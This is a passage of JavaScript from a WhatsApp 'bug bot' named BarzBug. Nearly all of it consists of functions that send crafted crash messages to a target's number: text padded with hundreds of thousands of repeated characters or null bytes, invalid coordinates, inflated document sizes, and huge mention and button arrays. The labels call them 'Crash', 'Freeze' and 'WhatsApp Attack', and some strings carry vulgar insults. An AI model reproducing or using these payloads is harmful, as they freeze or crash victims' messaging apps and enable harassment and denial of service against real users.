              caption: "Undangan Admin Saluran",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: p53
      });
      await BarzBug.relayMessage(p53, vGenerateWAMessageFromContent9.message, {
        participant: {
          jid: p53
        },
        messageId: vGenerateWAMessageFromContent9.key.id
      });
    }
    const v100 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v103 = {
      key: v100,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./lib/image/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const v105 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v108 = {
      key: v105,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./lib/image/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    async function f10(p54, p55) {
      var vGenerateWAMessageFromContent10 = generateWAMessageFromContent(p54, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "*`Sharelock! Tak Parani`* Kontol Lu Pecah!" + "ꦾ".repeat(500000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p54,
        quoted: p55
      });
      await BarzBug.relayMessage(p54, vGenerateWAMessageFromContent10.message, {
        participant: {
          jid: p54
        },
        messageId: vGenerateWAMessageFromContent10.key.id
      });
    }
    async function f11(p56, p57) {
      var vGenerateWAMessageFromContent11 = generateWAMessageFromContent(p56, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p56,
        quoted: p57
      });
      await BarzBug.relayMessage(p56, vGenerateWAMessageFromContent11.message, {
        participant: {
          jid: p56
        },
        messageId: vGenerateWAMessageFromContent11.key.id
      });
    }
    async function f12(p58) {
      await BarzBug.relayMessage(p58, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝘽𝙖𝙧𝙯𝙎𝙥𝙚𝙨𝙞𝙖𝙡",
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, {
        participant: {
          jid: p58
        }
      });
    }
    async function f13(p59) {
      let v110 = "𝘽𝙖𝙧𝙯𝙎𝙥𝙚𝙨𝙞𝙖𝙡";
      const v111 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v110,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v112 = {
        documentMessage: v111,
        title: v110,
        hasMediaAttachment: true
      };
      const v113 = {
        text: v110
      };
      const v117 = {
        header: v112,
        body: v113,
        nativeFlowMessage: {
          buttons: [{
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }, {
            name: "cta_url",
            buttonParamsJson: "{ display_text : '𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘋𝘪𝘬𝘢 𝘐𝘋', url : '', merchant_url : '' }"
          }]
        }
      };
      const v118 = {
        interactiveMessage: v117
      };
      const v119 = {
        message: v118
      };
      const v120 = {
        viewOnceMessage: v119
      };
      await BarzBug.relayMessage(p59, v120, {
        participant: {
          jid: p59
        }
      }, {
        messageId: null
      });
    }
    async function f14(p60) {
      let v122 = "𝘽𝙖𝙧𝙯𝙎𝙥𝙚𝙨𝙞𝙖𝙡" + "𑜦".repeat(40000);
      const v123 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v122,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v124 = {
        documentMessage: v123,
        title: v122,
        hasMediaAttachment: true
      };
      await BarzBug.relayMessage(p60, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v124,
              body: {
                text: ""
              },
              nativeFlowMessage: {
                buttons: Array(20).fill({
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                })
              }
            }
          }
        }
      }, {
        participant: {
          jid: p60
        }
      }, {
        messageId: null
      });
    }
    async function f15(p61) {
      let v127 = "𝘽𝙖𝙧𝙯𝙎𝙥𝙚𝙨𝙞𝙖𝙡";
      let v129 = Array.from({
        length: 200
      }, () => ({
        name: "call_permission_request",
        buttonParamsJson: "{}"
      }));
      let v131 = Array.from({
        length: 1039900
      }, () => p61);
      const v132 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v127,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v133 = {
        documentMessage: v132,
        title: v127,
        hasMediaAttachment: true
      };
      const v134 = {
        text: v127
      };
      const v135 = {
        buttons: v129
      };
      const v136 = {
        header: v133,
        body: v134,
        nativeFlowMessage: v135
      };
      const v137 = {
        interactiveMessage: v136
      };
      const v138 = {
        message: v137
      };
      const v140 = {
        mentionedJid: v131,
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: false,
          title: "𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱",
          body: "𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱",
          previewType: "VIDEO",
          thumbnail: "",
          sourceUrl: "https://www.whatsapp.com/",
          mediaUrl: "https://www.whatsapp.com/"
        }
      };
      const v141 = {
        viewOnceMessage: v138,
        contextInfo: v140
      };
      await BarzBug.relayMessage(p61, v141, {
        participant: {
          jid: p61
        }
      }, {
        messageId: null
      });
    }
    async function f16(p62) {
      let v143 = "𝘽𝙖𝙧𝙯𝙎𝙥𝙚𝙨𝙞𝙖𝙡";
      const v144 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v143,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v145 = {
        documentMessage: v144,
        hasMediaAttachment: true
      };
      const v146 = {
        text: v143
      };
      await BarzBug.relayMessage(p62, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v145,
              body: v146,
              nativeFlowMessage: {
                buttons: [{
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱  ◄" + "᬴".repeat(60000) + "\",\"sections\":[{\"title\":\"# 𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱\",\"flow_message_version\":\"9\",\"flow_token\":\"𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"𝐁𝐚𝐫𝐳𝐁𝐮𝐠𝐱\",\"body\":\"Zcoder Crash\"}"
              }
            }
          }
        }
      }, {
        participant: {
          jid: p62
        }
      }, {
        messageId: null
      });
    }
    async function f17(p63) {
      let v151 = "𝐁𝐫𝐮𝐭𝐚𝐥𝐢𝐭𝐲" + "ꦾ".repeat(50000);
      let v153 = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      const v154 = {
        title: " @120363326274964194@g.us",
        listType: "SINGLE_SELECT",
        singleSelectReply: {},
        description: " @120363326274964194@g.us",
        contextInfo: {}
      };
      v154.singleSelectReply.selectedRowId = "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘋𝘪𝘬𝘢 𝘐𝘋";
      v154.contextInfo.mentionedJid = v153;
      v154.contextInfo.groupMentions = [{
        groupJid: "120363326274964194@g.us",
        groupSubject: v151
      }];
      const v155 = {
        listResponseMessage: v154
      };
      const v156 = {
        message: v155
      };
      const v157 = {
        groupMentionedMessage: v156
      };
      let vV157 = v157;
      await BarzBug.relayMessage(p63, vV157, {
        participant: {
          jid: p63
        }
      }, {
        messageId: null
      });
    }
    async function f18(p64) {
      await BarzBug.relayMessage(p64, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 Barz 𝘐𝘋" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 Barz 𝘐𝘋"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: p64
        }
      }, {
        messageId: null
      });
    }
    async function f19(p65, p66, p67 = false) {
      let vGenerateWAMessageFromContent12 = generateWAMessageFromContent(p65, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝐁𝐚𝐫𝐳𝐓𝐡𝐞𝐆𝐞𝐧𝐤𝐳 🌷",
                  address: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                  jpegThumbnail: fs.readFileSync("./lib/image/zkosong.png")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "𝐁𝐚𝐫𝐳𝐓𝐡𝐞𝐆𝐞𝐧𝐤𝐳 🌷",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                    sections: [{
                      title: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p65,
        quoted: v93
      });
      await BarzBug.relayMessage(p65, vGenerateWAMessageFromContent12.message, p67 ? {
        participant: {
          jid: p65
        }
      } : {});
    }
    ;
    async function f20(p68, p69, p70, p71 = false) {
      let vGenerateWAMessageFromContent13 = generateWAMessageFromContent(p68, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠" + "ꦾ".repeat(777777),
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝐁𝐚𝐫𝐳𝐓𝐡𝐞𝐆𝐞𝐧𝐤𝐳 🌷",
                  address: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                  jpegThumbnail: fs.readFileSync("./lib/image/zkosong.png")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "𝐁𝐚𝐫𝐳𝐓𝐡𝐞𝐆𝐞𝐧𝐤𝐳 🌷",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                    sections: [{
                      title: "𝕭𝖆𝖗𝖟 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p68,
        quoted: v93
      });
      await BarzBug.relayMessage(p68, vGenerateWAMessageFromContent13.message, p71 ? {
        participant: {
          jid: p68
        }
      } : {});
    }
    ;
    
    //FUNCTION MONDAY 6 DES
    async function XiosVirus(target) {
      BarzBug.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `⩟⬦𪲁 𝐓͜͢BARZ̷̷̷𝐗͜͢𝐒 -` + "࣯ꦾ".repeat(900000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "⿻ᬃBarz Bugx 𝐊𝐢𝐥𝐥⃟⃟⿻‌" + "ꦾ".repeat(900000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
  async function BugDoc3(target) {
      let virtex = "📄𝗙𝗿𝗲𝗲𝘇𝗲𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁";

      BarzBug.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                    fileLength: "999999999",
                    pageCount: 0x9184e729fff,
                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                    fileName: virtex,
                    fileEncSha256:
                      "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1715880173",
                    contactVcard: true,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "🥶Barz🥶Bugx🥶" + "ꦾ".repeat(500000) + "@1".repeat(900000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "TAMAXSENTRY" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } }
      );
    }
    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await BarzBug.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://youtube.com/@tamainfinity",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
  async function CrashV2(target, Ptcp = false) {
      await BarzBug.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "EXECUTE BY BARZBUG" + "".repeat(900000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "INFINITY - CRASHER",
                body: "⩟⬦𪲁 BARZBU̷̷̷𝐗͜͢𝐒 -" + "\u0000" + "ꦾ".repeat(90000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " v ",
                sourceId: " v ",
                sourceUrl: "https://www.instagram.com/WhatsApp",
                mediaUrl: "https://www.instagram.com/WhatsApp",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.instagram.com/WhatsApp",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "0-0@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "0-0@g.us",
                serverMessageId: 1,
                newsletterName: " CRASHER ",
                contentType: "UPDATE",
                accessibilityText: " CRASHER ",
              },
              businessMessageForwardInfo: {
